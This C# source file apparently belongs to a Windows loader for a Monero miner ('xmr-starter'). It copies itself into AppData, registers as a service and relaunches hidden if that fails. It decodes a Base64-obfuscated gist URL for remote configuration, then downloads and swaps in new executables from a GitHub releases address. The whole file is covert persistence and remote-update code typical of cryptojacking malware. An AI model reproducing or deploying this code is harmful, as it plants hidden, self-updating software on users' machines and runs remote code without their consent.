
using System;
using System.Collections;
using System.Collections.Generic;
using System.Configuration.Install;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.ServiceProcess;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace nddi
{
    public class Uninstaller : MarshalByRefObject
    {
        public void Go(string file)
        {
            if (Program.IsInstalled())
            {
                Program.StopService();
                List<string> commandLine = new List<string>();
                AssemblyInstaller installer = new AssemblyInstaller(file, commandLine.ToArray());
                installer.UseNewContext = true;
                IDictionary state = new Hashtable();
                state.Clear();
                installer.Uninstall(state);
                installer.Dispose();
            }
        }
    }

    public static class Program
    {
        private static string GistsUrl
        {
            get
            {
                return Encoding.ASCII.GetString(Convert.FromBase64String("aHR0cHM6Ly9naXN0LmdpdGh1YnVzZXJjb250ZW50LmNvbS96b29sb29ob28vZjMzYTE5ZWZhMzQzYWU0MDg5ZjNlYTA3MzU2MTMzY2UvcmF3"));
            }
        }
        private static string InstalledDirectory;
        private static string ExecutableFileName;

        internal static string RunningDirectory;

        /// <summary>
        /// The main entry point for the application.
        /// </summary>
        static void Main(string[] args)
        {
            ServicePointManager.Expect100Continue = true;
            ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;

            InstalledDirectory = GetInstalledDirectory();
            ExecutableFileName = Path.GetFileName(Assembly.GetEntryAssembly().Location);
            RunningDirectory = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);

            Configuration config = new Configuration(GistsUrl);

            config.DefaultConfigNode.UpdatePluginTimeSpan = new TimeSpan(1, 0, 0, 0);
            config.DefaultConfigNode.UpdateConfigurationTimeSpan = new TimeSpan(0, 15, 0);
            config.DefaultConfigNode.SetDownloadUrl("nddir", "https://github.com/zooloohoo/xmr-starter/releases/download/LATEST/");

#if DEBUG
            config.DefaultConfigNode.UpdatePluginTimeSpan = new TimeSpan(0, 0, 10);
            config.DefaultConfigNode.UpdateConfigurationTimeSpan = new TimeSpan(0, 0, 30);
#endif

            if (Environment.UserInteractive)
            {
                if (args.Length > 0 && args[0] == "/r")
                {
                    Service1 serv = new Service1(config);
                    serv.TestStartupAndStop(args);
                }
                else
                {
                    if (args.Length > 0 && args[0] == "/u")
                    {
                        Uninstall(Path.Combine(InstalledDirectory, ExecutableFileName));
                        if (File.Exists(Path.Combine(InstalledDirectory, ExecutableFileName)))
                        {
                            File.Delete(Path.Combine(InstalledDirectory, ExecutableFileName));
                        }
                    }
                    else
                    {
                        CheckForUpdate(config, ExecutableFileName);

                        if (!IsInstalled())
                        {
                            try
                            {
                                Install(Path.Combine(InstalledDirectory, ExecutableFileName));
                            }catch(Exception e)
                            {
                                Process ExternalProcess = new Process();
                                ExternalProcess.StartInfo.FileName = Assembly.GetCallingAssembly().Location;
                                ExternalProcess.StartInfo.CreateNoWindow = true;
                                ExternalProcess.StartInfo.UseShellExecute = false;
                                ExternalProcess.StartInfo.Arguments = "/r";
                                
                                string processName = Path.GetFileNameWithoutExtension(ExternalProcess.StartInfo.FileName);
                                if (Process.GetProcessesByName(processName).Length == 1)
                                {
                                    ExternalProcess.Start();
                                }
                            }
                        }
                        StartService();
                    }
                }
            }
            else
            {
                ServiceBase[] ServicesToRun;
                ServicesToRun = new ServiceBase[]
                {
                new Service1(config)
                };
                ServiceBase.Run(ServicesToRun);
            }
        }

        private static void CheckForUpdate(Configuration config, string fileName)
        {
            //check if local file is copied
            string localDirectory = Path.GetDirectoryName(Assembly.GetEntryAssembly().Location);
            if (!File.Exists(Path.Combine(InstalledDirectory, fileName)))
            {
                try
                {
                    File.Copy(Path.Combine(localDirectory, fileName), Path.Combine(InstalledDirectory, fileName));
                }
                catch { }
            }

            // check if local file is more recent
            if (AssemblyName.GetAssemblyName(Path.Combine(localDirectory, fileName)).Version > AssemblyName.GetAssemblyName(Path.Combine(InstalledDirectory, fileName)).Version)
            {
                try
                {
                    Uninstall(Path.Combine(InstalledDirectory, ExecutableFileName));
                    Path.Combine(InstalledDirectory, fileName);
                    File.Delete(Path.Combine(InstalledDirectory, fileName));
                    File.Copy(Path.Combine(localDirectory, fileName), Path.Combine(InstalledDirectory, fileName));
                }
                catch { }
            }

            // check if latest version is more recent
            try
            {
                WebClient Client = new WebClient();
                Client.Proxy = null;
                Client.CachePolicy = new System.Net.Cache.RequestCachePolicy(System.Net.Cache.RequestCacheLevel.NoCacheNoStore);
                Client.Headers.Add("Cache-Control", "no-cache");
                string tmpExePath = Path.Combine(config.TempDirectory, fileName);

                Client.DownloadFile(config.ConfigNode.GetDownloadUrl("nddir") + "/" + fileName, tmpExePath);

                if (AssemblyName.GetAssemblyName(tmpExePath).Version > AssemblyName.GetAssemblyName(Path.Combine(InstalledDirectory, fileName)).Version)
                {
                    Uninstall(Path.Combine(InstalledDirectory, ExecutableFileName));
                    File.Delete(Path.Combine(InstalledDirectory, fileName));
                    File.Copy(tmpExePath, Path.Combine(InstalledDirectory, fileName));
                }
            }
            catch { }
        }

        private static string GetInstalledDirectory()
        {
            string installDir = null;
            installDir = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);
            if (!Directory.Exists(installDir))
            {
                try
                {
                    Directory.CreateDirectory(installDir);
                }
                catch
                {
                    installDir = "c:\\";
                }
            }

            return installDir;
        }

        private static void InstallFile(string destinationFile)
        {
            if (!File.Exists(destinationFile))
            {
                File.Copy(Assembly.GetEntryAssembly().Location, destinationFile);
            }
        }

        private static void Install(string file)
        {
            Uninstall(file);

            List<string> commandLine = new List<string>();
            AssemblyInstaller installer = new AssemblyInstaller(file, commandLine.ToArray());
            installer.UseNewContext = true;
            IDictionary state = new Hashtable();
            state.Clear();
            installer.Install(state);
            installer.Commit(state);
        }

        private static void Uninstall(string file)
        {
            AppDomain domain = AppDomain.CreateDomain("nddiu");
            var otherType = typeof(Uninstaller);
            var obj = domain.CreateInstanceAndUnwrap(otherType.Assembly.FullName, otherType.FullName) as Uninstaller;
            obj.Go(Path.Combine(InstalledDirectory, ExecutableFileName));
            AppDomain.Unload(domain);
        }

        internal static void StartService()
        {
            if (IsInstalled())
            {
                using (ServiceController service = new ServiceController(Service1.StaticServiceName))
                {
                    if (service.Status != ServiceControllerStatus.Running)
                    {
                        service.Start();
                    }
                }
            }
        }

        internal static void StopService()
        {
            if (IsInstalled())
            {
                using (ServiceController service = new ServiceController(Service1.StaticServiceName))
                {
                    if (service.Status != ServiceControllerStatus.Stopped)
                    {
                        service.Stop();
                    }
                }
            }
        }

        internal static bool IsInstalled()
        {
            foreach (ServiceController service in ServiceController.GetServices())
            {
                if (service.ServiceName == Service1.StaticServiceName)
                {
                    service.Close();
                    return true;
                }
                service.Close();
            }
            return false;
        }

        public static string GetMd5(string file)
        {
            using (var md5 = MD5.Create())
            {
                using (var stream = File.OpenRead(file))
                {
                    return Convert.ToBase64String(md5.ComputeHash(stream));
                }
            }
        }
    }
}
